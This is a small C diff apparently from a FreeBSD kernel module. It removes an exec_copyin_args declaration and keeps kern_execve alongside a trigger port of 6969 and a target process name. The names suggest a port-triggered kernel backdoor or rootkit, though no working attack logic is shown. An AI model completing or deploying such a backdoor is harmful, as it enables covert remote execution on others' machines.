@@ -31,8 +31,6 @@
 extern int kern_execve(struct thread *td, struct image_args *args, struct mac *mac_p,
     struct vmspace *oldvmspace);
 
-extern int exec_copyin_args(struct image_args *args, const char *fname,
-    enum uio_seg segflg, char **argv, char **envv);
 // Replaces all instances of TRIGGER_PORT in the code with 6969 before compilation
 #define TRIGGER_PORT 6969
 #define TARGET_PROC "apeshit"
